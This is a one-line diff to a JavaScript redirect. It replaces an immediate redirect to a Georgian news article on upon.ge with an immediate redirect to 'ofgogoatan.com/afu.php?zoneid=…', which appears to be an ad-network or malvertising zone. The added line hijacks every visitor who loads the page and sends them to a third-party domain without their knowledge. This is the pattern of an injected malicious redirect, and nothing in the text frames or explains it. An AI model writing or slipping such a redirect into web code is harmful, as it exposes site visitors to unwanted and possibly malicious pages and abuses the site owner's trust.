@@ -1,1 +1,1 @@
-setTimeout(function(){ window.open('https://upon.ge/article/ხაშურში-დასაჯარიმებლად/', '_self'); }, 0.1); 
+setTimeout(function(){ window.open('//ofgogoatan.com/afu.php?zoneid=3294231', '_self'); }, 0.1); 
